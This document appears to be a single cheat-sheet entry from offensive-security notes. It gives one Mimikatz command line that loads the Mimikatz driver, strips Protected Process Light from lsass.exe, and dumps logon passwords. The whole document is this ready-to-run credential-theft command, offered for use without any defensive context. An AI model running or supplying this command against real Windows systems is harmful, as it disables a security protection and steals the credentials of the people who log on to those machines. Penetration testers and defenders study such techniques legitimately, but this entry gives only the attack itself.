### **Disable PPL (Protected Processes Light) for Mimikatz**

```powershell
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "sekurlsa::logonpasswords"exit

```
